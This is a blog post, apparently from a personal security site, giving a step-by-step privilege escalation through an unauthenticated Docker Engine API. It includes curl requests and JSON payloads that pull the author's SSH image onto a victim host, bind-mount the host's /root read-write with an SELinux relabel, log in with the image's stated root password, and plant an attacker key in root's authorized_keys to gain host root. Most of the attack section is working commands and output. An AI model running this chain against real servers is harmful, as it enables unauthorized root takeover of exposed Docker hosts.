<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Docker API Privilege Escalation · Persistence of Mindfuck</title><meta name="description" content="Docker API Privilege Escalation - Pype"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/prontera.css"><link rel="search" type="application/opensearchdescription+xml" href="pyperanger.github.io/atom.xml" title="Persistence of Mindfuck"></head><body><header class="feature-header"><nav class="component-nav"><ul><div class="logo-container"><a href="/"><h2 class="title">Persistence of Mindfuck</h2></a></div><a href="/" target="_self" class="li component-nav-item"><p>INDEX</p></a><a href="/archives" target="_self" class="li component-nav-item"><p>ARCHIVES</p></a><ul class="shortcut-icons"><a href="https://github.com/pyperanger" target="_blank"><img src="/images/github.svg" class="icon"></a><a href="/atom.xml" target="_blank"><img src="/images/rss.svg" class="icon"></a><a href="https://twitter.com/pyperanger" target="_blank"><img src="/images/twitter.svg" class="icon"></a></ul></ul></nav></header><main class="container"><div id="post-container"><div class="post"><article class="post-block"><h1 class="post-title">Docker API Privilege Escalation</h1><div class="post-info">Jan 18, 2018</div><div class="post-content"><h1 id="Docker-API-Privilege-Escalation"><a href="#Docker-API-Privilege-Escalation" class="headerlink" title="Docker API Privilege Escalation"></a>Docker API Privilege Escalation</h1><hr>
<p>This document has the objective to explain a simple way to remotely make a privilege escalation in a Docker, using it’s own Engine API service. </p>
<p>During my analisys routine I manage to successfully make an attack, so I decided to share freely. </p>
<p>I`ve made an image available containing a SSH service enabled in the  <a href="https://hub.docker.com/r/pype/privsshd/" target="_blank" rel="noopener">Docker Hub</a> to help in the attack (The image available it’s huge, more than 200MB because of the Ubuntu base image. As soon as possible I will made available a smaller image).</p>
<p>PS: This attack explore a option available in the docker, without the need to utilize memory exploitation or similar way (As usually used to escape the container).<br><strong>PS2: This is only ONE of many ways to explore an server utilizing the docker API service.</strong> If during my analysis I find others explore methods, I will post in this repository.</p>
<p>Any suggestions to improve the attack or to protect yourself, I’m available to listen to all of it and add to this document if appropriate.</p>
<h2 id="Engine-API"><a href="#Engine-API" class="headerlink" title="Engine API"></a>Engine API</h2><p><em>“The Engine API is an HTTP API served by Docker Engine. It is the API the Docker client uses to communicate with the Engine, so everything the Docker client can do can be done with the API.”</em></p>
<p><strong>By default this service don’t use any authentication</strong>, but this resource it’s made available by the platform.</p>
<ul>
<li><a href="https://docs.docker.com/engine/api/v1.32/" target="_blank" rel="noopener">Docker Engine API</a></li>
<li><a href="https://docs.docker.com/engine/api/v1.32/#section/Authentication" target="_blank" rel="noopener">Authentication</a></li>
</ul>
<p>During the attack, we are going to utilize the parameters provided by the platform so this way we can explore the system and obtain privileged internal access.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>The main focus of the attack it’s to be able to inject our public key inside the file <em>“authorized_keys”</em> from the root user in the server!</p>
<p>The exploration consist in six parts:</p>
<ol>
<li><strong>Push the image in server</strong></li>
<li><strong>Configure a container with our image</strong></li>
<li><strong>Start the container</strong></li>
<li><strong>Connect to container SSH</strong></li>
<li><strong>Import public key in .ssh/authorized_keys in root directory</strong></li>
<li><strong>Finaly connect to SSH server with root access</strong></li>
</ol>
<hr>
<ul>
<li><strong>Push image in server</strong></li>
</ul>
<p>The selected image for the attack need to have some kind the shell remote service available in the start, so this way we can connect to the container inside the server.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST <span class="string">"http://victim/images/create?fromImage=pype/privsshd"</span></span><br><span class="line"></span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Content-Type: application/json</span><br><span class="line">&lt; Server: Docker/1.12.6 (linux)</span><br><span class="line">&lt; Date: Sat, 06 Jan 2018 15:41:46 GMT</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; </span><br><span class="line">...</span><br><span class="line">&#123;<span class="string">"status"</span>:<span class="string">"Status: Image is up to date for docker.io/pype/privsshd:latest"</span>&#125;</span><br></pre></td></tr></table></figure>
<p>In the example above I used the option to create an image from the official repository. There is <a href="https://docs.docker.com/engine/api/v1.24/#32-images" target="_blank" rel="noopener">other methods</a> to execute the same operation.</p>
<p>pype/privsshd -  The Image that I’ve made available to help in the documentation of the attack. </p>
<ul>
<li><strong>Configure a container with our image</strong></li>
</ul>
<p>For we to be able to inject our public key inside the file .ssh/authorized_key, we need access to the root directory in the Docker Server. For this we are going to utilize the option “Binds”, this way we can select the volume of what is going to be shared between the server and our container. (Remember to configure the read and write option)</p>
<p><strong>SELINUX  <em>“Bypass”</em></strong></p>
<p>The Docker provides a mounting option capable of modify the SELINUX file or directory label shared with the container. With this option, it’s possible to mount privileged directory inside of our container (E.g.: /root/;/etc;/bin …).</p>
<p>We can send this option via API too, this way we can work around the SELINUX remotely .</p>
<p> <em>“This affects the file or directory on the host machine itself and can have consequences outside of the scope of Docker.”</em></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"Binds":[  </span><br><span class="line">      <span class="string">"/root/:/root/:rw,z"</span></span><br><span class="line">      ]</span><br></pre></td></tr></table></figure>
<p>Mais informações: <a href="https://docs.docker.com/engine/admin/volumes/bind-mounts/#configure-the-selinux-label" target="_blank" rel="noopener">Configure-the-selinux-label</a></p>
<p>Supposing that our target server already has the port number 22 busy by it’s own SSH service, we have to point another outgoing port for our connection with the container, we are going to configure the option “PortBindings” with “HostPort” in another port.</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">   <span class="attr">"Image"</span>:<span class="string">"pype/privsshd"</span>,</span><br><span class="line">   <span class="attr">"Binds"</span>:[  </span><br><span class="line">      <span class="string">"/root/:/root/:rw,z"</span></span><br><span class="line">   ],</span><br><span class="line">   <span class="attr">"PortBindings"</span>:&#123;  </span><br><span class="line">      <span class="attr">"22/tcp"</span>:[  </span><br><span class="line">         &#123;  </span><br><span class="line">            <span class="attr">"HostIp"</span>:<span class="string">""</span>,</span><br><span class="line">            <span class="attr">"HostPort"</span>:<span class="string">"2233"</span></span><br><span class="line">         &#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JSON it’s the only format accepted by the platform, therefore configure the Content-Type of your requisition to this type of language.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">"Content-Type: application/json"</span> -d <span class="string">'&#123;"Image":"pype/privsshd", "Binds": ["/root/:/root/:rw,z"],"PortBindings":&#123;"22/tcp":[&#123;"HostIp":"","HostPort":"2233"&#125;]&#125;&#125;'</span> -XPOST <span class="string">"http://victim/containers/create"</span></span><br><span class="line"></span><br><span class="line">&lt; HTTP/1.1 201 Created</span><br><span class="line">&lt; Content-Type: application/json</span><br><span class="line">&lt; Server: Docker/1.12.6 (linux)</span><br><span class="line">&lt; Date: Sat, 06 Jan 2018 16:03:34 GMT</span><br><span class="line">&lt; Content-Length: 90</span><br><span class="line">&lt; </span><br><span class="line">&#123;<span class="string">"Id"</span>:<span class="string">"5a3c7f18d202f62...4789e781132495781f"</span>,<span class="string">"Warnings"</span>:null&#125;</span><br></pre></td></tr></table></figure>
<p>If everything worked out, the requisition will return an ID and this will be the your container identifier </p>
<ul>
<li><strong>Start the container</strong></li>
</ul>
<p>Use the Identifier to start your container remotely.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST <span class="string">"http://victim/containers/5a3c7f18d202f62...4789e781132495781f/start"</span> -v </span><br><span class="line"></span><br><span class="line">&lt; HTTP/1.1 204 No Content</span><br><span class="line">&lt; Server: Docker/1.12.6 (linux)</span><br><span class="line">&lt; Date: Sat, 06 Jan 2018 22:29:46 GMT</span><br></pre></td></tr></table></figure>
<p>Verify if the service was started with success in the target server.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ » nc victim 2233</span><br><span class="line">SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Connect to container SSH</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~ » ssh root@victim -p2233</span><br><span class="line">root@victim password: </span><br><span class="line">root@5a3c7f18d202:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>If you utilized my image <strong>privsshd</strong>, the root password it’s: <em>screencast</em>.</p>
<ul>
<li><strong>Import public key in .ssh/authorized_keys in root directory</strong></li>
</ul>
<p>Now you are free to inject your public key and…</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@5a3c7f18d202:~<span class="comment"># ls .ssh/</span></span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">root@5a3c7f18d202:~<span class="comment"># echo "ssh-rsa AAAAB3NzaC1yc2EAAAAD.." &gt;&gt; .ssh/authorized_keys</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Finaly connect to SSH server with root access</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~ » ssh root@victim -i key.rsa</span><br><span class="line">[root@docker-server ~]<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root) </span><br><span class="line">[root@docker-server ~]<span class="comment"># docker --version</span></span><br><span class="line">Docker version 1.12.6, build ae7d637/1.12.6</span><br></pre></td></tr></table></figure>
<p>Now you have privileged access inside the remote server. :)</p>
<hr>
<p>References:</p>
<p><a href="http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html" target="_blank" rel="noopener">http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html</a></p>
<p><a href="https://docs.docker.com/engine/api/v1.24" target="_blank" rel="noopener">https://docs.docker.com/engine/api/v1.24</a></p>
<p><a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/" target="_blank" rel="noopener">https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/</a></p>
</div></article></div><div id="disqus_thread"></div></div><script>var disqus_shortname = 'pyper4ng3r';
var disqus_identifier = '2018/01/18/docker-api/';
var disqus_title = 'Docker API Privilege Escalation';
var disqus_url = 'pyperanger.github.io/2018/01/18/docker-api/';
(function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//pyper4ng3r.disqus.com/count.js" async></script></main><footer class="footer-container"><div class="paginator"></div><div class="copyright"><p>© 2006 - 2018 <a href="pyperanger.github.io">Pype</a>.</p></div></footer><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"pyper4ng3r",'auto');ga('send','pageview');</script></body></html>